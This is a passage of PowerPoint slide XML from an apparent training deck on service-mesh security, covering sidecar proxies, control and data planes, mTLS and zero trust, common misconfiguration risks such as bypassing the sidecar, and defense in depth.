                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> deployment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Classic implementation model:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>data plane</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> of sidecar proxies (Envoy, etc.) injected next to each service.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>control plane</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> that pushes config and policies to those proxies (Istio, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Linkerd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, etc.).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="429407041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47051-75E4-8BD0-86FE-0B89F68FE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66163-06BE-6F6C-5C08-4AEB9197A9B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Sidecar Proxies</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{68B354E2-8EE4-2720-43C8-1919A4008898}"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>sidecar proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001D35"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>a separate container running alongside an application container that intercepts and manages all network traffic for it, handling tasks like security, observability, and routing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, making it a key component of a modern service mesh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="116441568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0CFC-3C0C-B8BF-69C8-6AB2543C9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04B1A-095B-1A13-3021-50F705F69DA5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Service Mesh Capabilities</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3D14B77E-44DC-4F7B-493C-0DEEF64DF203}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7695323" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Service discovery &amp; routing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Retries, timeouts, circuit breaking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Load balancing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Observability (traces, metrics, logs)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Security features:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Automatic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>mutual TLS (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> between services</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Fine-grained access control / policies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Zero-trust enforcement</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32204706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DB7F0-6932-7930-8557-0201D8A1B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7D32-EEE9-F756-F9C3-7522B00FC37E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Service Mesh Security Benefits</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0F04CA35-0224-93ED-6162-EB7C5BFDCA42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7695323" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> everywhere</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Zero trust inside the cluster</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Centralized policy management</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Deep visibility</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="91291456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6A95-8CFE-47DB-E57E-5A9B28D81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DF188-4E3D-3567-4CBA-D21D623AF209}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Service Mesh Challenges/Risks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{300B1747-554A-3723-F46E-45F715286957}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7695323" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Complexity and misconfiguration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Misconfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> can silently:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Disable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> for some traffic.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Open overly broad east–west access (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>*-to-*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> allow rules).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Bypass paths</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Devs might:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Call a database directly without going through the sidecar.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Expose </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>NodePorts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> for “debugging”.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Performance and cost</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Every request hits two extra proxies; this adds overhead.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19807472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60C6-555C-7D8A-33AD-1A30B39C0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F55FF-935E-9318-7BF1-B3D97C83F83C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Defense in Depth</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7CB6457-1B14-0897-04EC-C1A79BB5A1C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="5609183" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Defense in depth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is the practice of using multiple, independent security controls at different layers, so that if one fails, others still protect CIA.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="+mn-lt"/>
